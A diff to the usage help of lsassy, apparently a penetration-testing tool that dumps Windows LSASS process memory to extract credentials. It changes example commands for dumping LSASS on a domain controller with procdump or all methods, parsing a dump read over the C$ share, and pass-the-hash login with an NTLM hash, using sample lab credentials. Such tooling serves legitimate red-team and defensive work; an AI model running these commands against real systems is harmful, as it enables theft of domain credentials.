@@ -25,17 +25,18 @@ def run():
   ** RunDLL Dump Method **
   lsassy adsec.local/pixis:p4ssw0rd@dc01.adsec.local
   
+  ** Try all methods **
+  lsassy -m 0 adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+
   ** Procdump Dump Method **
-  lsassy -P /tmp/procdump.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+  lsassy -m 2 -p /tmp/procdump.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
   
   ** Remote parsing only **
-  lsassy -p C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+  lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
   
   ** Output functions **
-  lsassy -j -q -p C$/Windows/Temp/lsass.dmp localuser@desktop01.adsec.local
-  lsassy --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local
-  
-  lsassy -d adsec.local/pixis:p4ssw0rd@dc01.adsec.local'''
+  lsassy -j -q localuser@desktop01.adsec.local
+  lsassy -g --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local'''
 
     parser = argparse.ArgumentParser(
         prog="lsassy",
